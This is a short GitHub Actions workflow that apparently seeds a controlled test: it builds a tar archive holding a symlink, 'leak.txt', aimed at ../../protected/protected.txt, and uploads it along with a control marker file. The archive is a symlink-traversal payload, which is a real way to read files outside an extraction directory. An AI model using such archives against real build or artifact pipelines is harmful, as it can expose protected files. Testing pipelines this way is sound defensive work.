name: G01 symlink archive source

on:
  workflow_dispatch:
  push:

permissions:
  contents: read

jobs:
  seed:
    runs-on: ubuntu-latest
    steps:
      - name: Create controlled archive payload
        run: |
          rm -rf payload
          mkdir -p payload
          ln -s ../../protected/protected.txt payload/leak.txt
          printf "%s\n" "G01_SYMLINK_ARCHIVE_CONTROL_20260803_A3" > payload/control.txt
          tar -cf payload.tar -C payload leak.txt
          tar -tvf payload.tar
      - name: Upload archive payload
        uses: actions/upload-artifact@v4
        with:
          name: g01-symlink-archive-20260803-a3
          path: |
            payload.tar
            payload/control.txt
